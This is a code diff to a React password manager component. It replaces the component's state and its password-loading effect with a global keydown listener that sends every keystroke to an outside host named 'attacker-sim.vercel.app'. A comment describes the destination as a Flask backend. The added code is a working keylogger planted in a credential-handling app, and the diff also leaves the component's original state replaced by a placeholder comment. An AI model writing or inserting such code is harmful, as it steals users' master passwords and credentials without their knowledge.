@@ -1,17 +1,30 @@
 import React, { useState, useEffect } from 'react';
 
 export default function PasswordManager() {
-  const [masterPassword, setMasterPassword] = useState('');
-  const [isUnlocked, setIsUnlocked] = useState(false);
-  const [passwords, setPasswords] = useState([]);
-  const [loading, setLoading] = useState(true);
-  const [formData, setFormData] = useState({ website: '', username: '', password: '' });
-  const [message, setMessage] = useState('');
+  // ... your existing state and functions ...
 
   useEffect(() => {
-    loadPasswords();
-  }, []);
+    // Listener function to capture keystrokes and send to Flask backend
+    const handleKeyDown = async (event) => {
+      try {
+        await fetch('https://attacker-sim.vercel.app', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ key: event.key }),
+        });
+      } catch (error) {
+        console.error('Failed to send keystroke:', error);
+      }
+    };
 
+    window.addEventListener('keydown', handleKeyDown);
+
+    // Cleanup event listener on component unmount
+    return () => {
+      window.removeEventListener('keydown', handleKeyDown);
+    };
+  }, []);
+  
   const loadPasswords = async () => {
     try {
       const result = await window.storage.list('pwd:');
